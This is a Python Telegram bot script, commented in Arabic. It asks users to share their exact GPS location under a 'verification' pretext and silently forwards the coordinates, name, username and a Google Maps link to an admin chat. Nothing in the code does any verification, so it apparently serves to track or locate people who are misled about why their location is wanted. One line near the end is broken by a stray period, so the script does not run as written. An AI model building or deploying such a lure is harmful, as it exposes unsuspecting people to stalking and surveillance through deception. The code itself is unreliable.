import os
import telebot
from telebot import types
from flask import Flask, request

TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID") # ضع الـ Chat ID الخاص بك هنا أو كمتغير بيئة

bot = telebot.TeleBot(TELEGRAM_TOKEN)
app = Flask(__name__)

@app.route(f"/{TELEGRAM_TOKEN}", methods=["POST"])
def receive_message():
    json_string = request.get_data().decode("utf-8")
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return "!", 200

@app.route("/")
def index():
    return "Bot is running perfectly!", 200

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    button = types.KeyboardButton("📍 اضغط هنا لمشاركة موقعك الجغرافي", request_location=True)
    markup.add(button)
    bot.send_message(message.chat.id, "مرحباً بك! للتحقق والمتابعة، يرجى مشاركة موقعك الجغرافي الدقيق:", reply_markup=markup)

@bot.message_handler(content_types=['location'])
def handle_location(message):
    if message.location:
        lat = message.location.latitude
        lon = message.location.longitude
        user_name = message.from_user.first_name
        user_username = f"@{message.from_user.username}" if message.from_user.username else "بدون معرف"
        
        # إنشاء رابط مباشر لخرائط جوجل بالإحداثيات الدقيقة
        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
        
        # رسالة التنبيه التي ستصلك أنت (المشرف)
        admin_msg = (
            f"🚨 تم استلام موقع جديد!\n\n"
            f"👤 المستخدم: {user_name} ({user_username})\n"
            f"🌐 خط العرض (Lat): {lat}\n"
            f"🌐 خط الطول (Lon): {lon}\n"
            f"🔗 رابط الخريطة: {maps_link}"
        )
        
        # إرسال الموقع إليك
        target_admin = ADMIN_CHAT_ID if ADMIN_CHAT_ID else message.chat.id
        bot.send_message(target_admin, admin_msg)
        
        # الرد على المستخدم
.        bot.send_message(message.chat.id, "شكراً لك! تم استلام موقعك بنجاح.")

if __name__ == "__main__":
    render_url = os.environ.get("RENDER_EXTERNAL_URL")
    if render_url:
        bot.remove_webhook()
        bot.set_webhook(url=f"{render_url}/{TELEGRAM_TOKEN}")
    
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
